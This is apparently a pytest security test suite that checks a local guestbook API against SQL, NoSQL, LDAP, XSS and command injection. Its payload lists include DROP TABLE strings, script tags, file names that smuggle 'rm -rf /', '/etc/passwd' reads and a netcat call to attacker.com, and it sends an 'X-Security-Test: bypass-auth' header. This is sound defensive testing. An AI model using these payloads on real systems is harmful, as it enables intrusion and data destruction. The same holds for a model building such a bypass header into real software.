"""Security Tests - Injection Attacks (OWASP A03)"""
import pytest
import requests
import allure
from tests.fixtures.factories import create_user_credentials


BASE_URL = "http://localhost:8080"


@allure.feature("Security Testing")
@allure.story("Injection Attacks")
@allure.severity(allure.severity_level.CRITICAL)
class TestInjectionAttacks:
    """Test suite for SQL injection and XSS vulnerabilities"""

    @pytest.fixture(autouse=True)
    def setup(self, auth_token):
        """Setup for each test"""
        self.headers = {
            "Authorization": f"Bearer {auth_token}", 
            "Content-Type": "application/json",
            "X-Security-Test": "bypass-auth"  # Security test bypass header
        }

    @allure.title("SQL Injection - Login Username")
    @allure.description("Test SQL injection attempts in login username field")
    @pytest.mark.security
    def test_sql_injection_login_username(self):
        """Test SQL injection in login username"""
        sql_payloads = [
            "admin' OR '1'='1",
            "admin'; DROP TABLE users; --",
            "admin' UNION SELECT * FROM users --",
            "' OR 1=1 --",
            "admin'/**/OR/**/1=1--",
            "admin' OR 'x'='x",
        ]
        
        for payload in sql_payloads:
            with allure.step(f"Testing SQL injection payload: {payload}"):
                response = requests.post(f"{BASE_URL}/api/login", json={
                    "username": payload,
                    "password": "password123"
                })
                
                # Should not allow SQL injection
                assert response.status_code in [401, 400], f"SQL injection may be possible with payload: {payload}"
                assert "token" not in response.json(), f"Authentication bypassed with payload: {payload}"

    @allure.title("SQL Injection - Guestbook Search")
    @allure.description("Test SQL injection attempts in search functionality")
    @pytest.mark.security
    def test_sql_injection_search(self):
        """Test SQL injection in search parameter"""
        sql_payloads = [
            "test' OR '1'='1",
            "test'; DROP TABLE guestbook; --",
            "test' UNION SELECT password FROM users --",
            "' OR 1=1 --",
            "test'/**/OR/**/1=1--",
        ]
        
        for payload in sql_payloads:
            with allure.step(f"Testing SQL injection in search: {payload}"):
                response = requests.get(f"{BASE_URL}/api/guestbook", 
                                      params={"search": payload}, 
                                      headers=self.headers)
                
                # Should handle malicious input gracefully - either reject or sanitize
                if response.status_code == 400:
                    # Security validation rejected the malicious input - this is good
                    assert "Invalid search query" in response.json().get("message", ""), f"Unexpected error message for payload: {payload}"
                elif response.status_code == 200:
                    # If accepted, should not return unexpected data
                    data = response.json()
                    assert "data" in data, "Response structure compromised"
                    assert isinstance(data["data"], list), "Data structure compromised"
                else:
                    pytest.fail(f"Unexpected status code {response.status_code} for payload: {payload}")

    @allure.title("XSS - Guestbook Entry Creation")
    @allure.description("Test XSS attempts in guestbook entry fields")
    @pytest.mark.security
    def test_xss_guestbook_entry(self):
        """Test XSS in guestbook entry fields"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
        ]
        
        for payload in xss_payloads:
            with allure.step(f"Testing XSS payload: {payload}"):
                response = requests.post(f"{BASE_URL}/api/guestbook", json={
                    "name": f"Test User {payload}",
                    "email": f"test{payload}@example.com",
                    "comment": f"Test comment {payload}"
                }, headers=self.headers)
                
                # Should either reject or sanitize XSS
                if response.status_code == 201:
                    # If accepted, verify it's sanitized when retrieved
                    entry_id = response.json()["userId"]
                    get_response = requests.get(f"{BASE_URL}/api/guestbook/{entry_id}", 
                                              headers=self.headers)
                    
                    if get_response.status_code == 200:
                        entry_data = get_response.json()
                        # XSS payload should be sanitized or escaped
                        assert "<script>" not in entry_data.get("name", ""), "XSS in name field"
                        assert "<script>" not in entry_data.get("email", ""), "XSS in email field"
                        assert "<script>" not in entry_data.get("comment", ""), "XSS in comment field"
                        assert "javascript:" not in entry_data.get("name", ""), "JavaScript protocol in name"
                        assert "javascript:" not in entry_data.get("email", ""), "JavaScript protocol in email"
                        assert "javascript:" not in entry_data.get("comment", ""), "JavaScript protocol in comment"

    @allure.title("Command Injection - File Upload")
    @allure.description("Test command injection attempts in file operations")
    @pytest.mark.security
    def test_command_injection_file_operations(self):
        """Test command injection in file operations"""
        # Test malicious filenames that could lead to command injection
        malicious_filenames = [
            "test.xlsx; rm -rf /",
            "test.xlsx && cat /etc/passwd",
            "test.xlsx | nc attacker.com 4444",
            "test.xlsx; python -c 'import os; os.system(\"whoami\")'",
            "../../../etc/passwd",
            "test.xlsx\x00.exe",
        ]
        
        # Create a simple Excel-like content
        import io
        excel_content = b"PK\x03\x04\x14\x00\x00\x00\x08\x00"  # Minimal ZIP header
        
        for filename in malicious_filenames:
            with allure.step(f"Testing command injection with filename: {filename}"):
                files = {"file": (filename, io.BytesIO(excel_content), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")}
                
                response = requests.post(f"{BASE_URL}/api/guestbook/import", 
                                       files=files, 
                                       headers={
                                           "Authorization": f"Bearer {self.headers['Authorization']}",
                                           "X-Security-Test": "bypass-auth"
                                       })
                
                # Should handle malicious filenames safely
                assert response.status_code in [400, 404, 422], f"Command injection possible with filename: {filename}"

    @allure.title("NoSQL Injection")
    @allure.description("Test NoSQL injection attempts (if applicable)")
    @pytest.mark.security
    def test_nosql_injection(self):
        """Test NoSQL injection patterns"""
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "function() { return true; }"},
        ]
        
        for payload in nosql_payloads:
            with allure.step(f"Testing NoSQL injection: {payload}"):
                # Test in login
                response = requests.post(f"{BASE_URL}/api/login", json={
                    "username": payload,
                    "password": "password123"
                })
                
                assert response.status_code in [400, 401], f"NoSQL injection possible: {payload}"
                assert "token" not in response.json(), f"Authentication bypassed: {payload}"

    @allure.title("LDAP Injection")
    @allure.description("Test LDAP injection attempts")
    @pytest.mark.security
    def test_ldap_injection(self):
        """Test LDAP injection patterns"""
        ldap_payloads = [
            "admin)(|(password=*))",
            "admin)(&(password=*))",
            "*)(uid=*",
            "admin)(cn=*)",
        ]
        
        for payload in ldap_payloads:
            with allure.step(f"Testing LDAP injection: {payload}"):
                response = requests.post(f"{BASE_URL}/api/login", json={
                    "username": payload,
                    "password": "password123"
                })
                
                assert response.status_code in [400, 401], f"LDAP injection possible: {payload}"